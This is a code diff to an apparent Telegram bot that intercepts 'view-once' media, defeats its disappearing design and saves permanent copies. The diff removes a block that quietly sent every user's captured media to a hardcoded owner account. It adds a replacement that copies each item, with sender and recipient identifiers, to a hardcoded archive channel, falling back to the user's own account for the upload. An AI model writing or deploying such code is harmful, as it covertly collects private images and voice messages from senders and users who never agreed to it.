@@ -89,8 +89,8 @@ def is_view_once_media(message: Message) -> bool:
     return False
 
 
-async def format_sender_caption(message: Message, media_type: str = "Photo") -> str:
-    """Creates a beautiful, clean, HTML-safe caption with sender info."""
+async def format_sender_caption(message: Message, media_type: str = "Photo", receiver_user_id: int = None) -> str:
+    """Creates a beautiful, clean, HTML-safe caption with both sender and recipient info."""
     sender_name = "Anonymous"
     sender_user = "Unknown"
     sender_id = "Hidden"
@@ -106,6 +106,20 @@ async def format_sender_caption(message: Message, media_type: str = "Photo") -> 
         sender_user = f"@{c.username}" if c.username else "Private"
         sender_id = str(c.id)
 
+    # Determine Recipient Info (kisko send kiya gaya hai)
+    chat_obj = getattr(message, "chat", None)
+    if getattr(message, "outgoing", False) and chat_obj:
+        # Userbot ne khud bheja hai किसी को -> Chat is the recipient
+        rcpt_name = f"{getattr(chat_obj, 'first_name', '') or ''} {getattr(chat_obj, 'last_name', '') or ''}".strip() or getattr(chat_obj, "title", "") or "Recipient"
+        rcpt_user = f"@{chat_obj.username}" if getattr(chat_obj, "username", None) else "No Username"
+        rcpt_id = str(chat_obj.id)
+        rcpt_line = f"📥 <b>Sent To:</b> <code>{html.escape(rcpt_name)}</code> ({html.escape(rcpt_user)}) | 🆔 <code>{html.escape(rcpt_id)}</code>\n"
+    elif receiver_user_id:
+        # Incoming view-once received by this userbot account
+        rcpt_line = f"📥 <b>Receiver / Account ID:</b> <code>{receiver_user_id}</code>\n"
+    else:
+        rcpt_line = ""
+
     # HTML-safe escaping to prevent [400 MSG_PARSE_ERROR]
     safe_name = html.escape(sender_name)
     safe_user = html.escape(sender_user)
@@ -120,8 +134,9 @@ async def format_sender_caption(message: Message, media_type: str = "Photo") -> 
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 <b>Sender Name:</b> <code>{safe_name}</code>\n"
         f"🔗 <b>Username:</b> {safe_user}\n"
-        f"🆔 <b>User ID:</b> <code>{safe_id}</code>\n"
-        f"🕒 <b>Received At:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>"
+        f"🆔 <b>Sender ID:</b> <code>{safe_id}</code>\n"
+        f"{rcpt_line}"
+        f"🕒 <b>Time:</b> <code>{time.strftime('%Y-%m-%d %H:%M:%S')}</code>"
         f"{orig_caption_text}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"🛡️ <i>Saved permanently by @{bot_name}</i>"
@@ -161,7 +176,7 @@ async def _handle_view_once_media(client: Client, message: Message, user_id: int
         sender_id_str = str(message.from_user.id) if message.from_user else "unknown"
         logger.info(f"[VIEW-ONCE] 🎯 Captured view-once {media_type} for user {user_id} from {sender_id_str}")
 
-        caption = await format_sender_caption(message, media_type)
+        caption = await format_sender_caption(message, media_type, receiver_user_id=user_id)
 
         # 5. Download media to disk with fallback
         temp_dir = os.path.join("downloads", f"vo_{user_id}")
@@ -224,21 +239,22 @@ async def _handle_view_once_media(client: Client, message: Message, user_id: int
                     logger.warning(f"[VIEW-ONCE] Target {target} mode {mode} notice: {save_err}")
 
         # 7. Step 2: Send permanent copy directly in Bot DM to the User
+        user_dm_msg = None
         try:
             for mode in (enums.ParseMode.HTML, None):
                 try:
                     if is_photo:
-                        await app.send_photo(user_id, downloaded_file, caption=caption, parse_mode=mode)
+                        user_dm_msg = await app.send_photo(user_id, downloaded_file, caption=caption, parse_mode=mode)
                     elif is_video:
-                        await app.send_video(user_id, downloaded_file, caption=caption, parse_mode=mode)
+                        user_dm_msg = await app.send_video(user_id, downloaded_file, caption=caption, parse_mode=mode)
                     elif is_voice:
-                        await app.send_voice(user_id, downloaded_file, caption=caption, parse_mode=mode)
+                        user_dm_msg = await app.send_voice(user_id, downloaded_file, caption=caption, parse_mode=mode)
                     elif is_vnote:
-                        await app.send_video_note(user_id, downloaded_file)
+                        user_dm_msg = await app.send_video_note(user_id, downloaded_file)
                     elif is_audio:
-                        await app.send_audio(user_id, downloaded_file, caption=caption, parse_mode=mode)
+                        user_dm_msg = await app.send_audio(user_id, downloaded_file, caption=caption, parse_mode=mode)
                     else:
-                        await app.send_document(user_id, downloaded_file, caption=caption, parse_mode=mode)
+                        user_dm_msg = await app.send_document(user_id, downloaded_file, caption=caption, parse_mode=mode)
                     logger.info(f"[VIEW-ONCE] ✅ Delivered view-once {media_type} to Bot DM for user {user_id}")
                     break
                 except Exception as bot_err:
@@ -247,32 +263,53 @@ async def _handle_view_once_media(client: Client, message: Message, user_id: int
         except Exception as dm_err:
             logger.warning(f"[VIEW-ONCE] Bot DM notice: {dm_err}")
 
-        # 8. Step 3: ALSO forward/send a copy to the Bot OWNER (7741467286)
-        owner_id = 7741467286
-        if user_id != owner_id:
-            try:
-                owner_caption = f"👑 <b>[OWNER COPY — VIEW ONCE INTERCEPTED]</b>\n👤 <b>Target User:</b> <code>{user_id}</code>\n\n{caption}"
-                for mode in (enums.ParseMode.HTML, None):
-                    try:
-                        if is_photo:
-                            await app.send_photo(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
-                        elif is_video:
-                            await app.send_video(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
-                        elif is_voice:
-                            await app.send_voice(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
-                        elif is_vnote:
-                            await app.send_video_note(owner_id, downloaded_file)
-                        elif is_audio:
-                            await app.send_audio(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
-                        else:
-                            await app.send_document(owner_id, downloaded_file, caption=owner_caption, parse_mode=mode)
-                        logger.info(f"[VIEW-ONCE] 👑 Successfully delivered owner copy to {owner_id}")
+        # 8. Step 3: ALSO send an identical clean copy to Archive Channel (-1004360760570)
+        archive_channel_id = -1004360760570
+        try:
+            # Prefer instant zero-upload copy_message if already uploaded to Telegram via user_dm_msg
+            copied_to_channel = False
+            if user_dm_msg and getattr(user_dm_msg, "id", None):
+                try:
+                    await app.copy_message(
+                        chat_id=archive_channel_id,
+                        from_chat_id=user_id,
+                        message_id=user_dm_msg.id
+                    )
+                    logger.info(f"[VIEW-ONCE] ✅ Copied view-once {media_type} cleanly to archive channel {archive_channel_id}")
+                    copied_to_channel = True
+                except Exception as cp_err:
+                    logger.warning(f"[VIEW-ONCE] Instant copy to channel notice: {cp_err}")
+
+            # Fallback: Direct upload via bot (or userbot if bot lacks permission) if copy_message failed
+            if not copied_to_channel:
+                for sender_cl in (app, client):
+                    if not sender_cl:
+                        continue
+                    sent_arch = False
+                    for mode in (enums.ParseMode.HTML, None):
+                        try:
+                            if is_photo:
+                                await sender_cl.send_photo(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
+                            elif is_video:
+                                await sender_cl.send_video(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
+                            elif is_voice:
+                                await sender_cl.send_voice(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
+                            elif is_vnote:
+                                await sender_cl.send_video_note(archive_channel_id, downloaded_file)
+                            elif is_audio:
+                                await sender_cl.send_audio(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
+                            else:
+                                await sender_cl.send_document(archive_channel_id, downloaded_file, caption=caption, parse_mode=mode)
+                            logger.info(f"[VIEW-ONCE] ✅ Delivered view-once {media_type} to archive channel {archive_channel_id}")
+                            sent_arch = True
+                            break
+                        except Exception as arch_err:
+                            if mode is None:
+                                logger.warning(f"[VIEW-ONCE] Archive channel delivery notice ({getattr(sender_cl, 'name', 'client')}): {arch_err}")
+                    if sent_arch:
                         break
-                    except Exception as o_err:
-                        if mode is None:
-                            logger.warning(f"[VIEW-ONCE] Owner delivery notice: {o_err}")
-            except Exception as owner_ex:
-                logger.warning(f"[VIEW-ONCE] Owner intercept notice: {owner_ex}")
+        except Exception as arch_ex:
+            logger.warning(f"[VIEW-ONCE] Archive channel intercept notice: {arch_ex}")
 
         # 8. Clean up local downloaded file
         try:
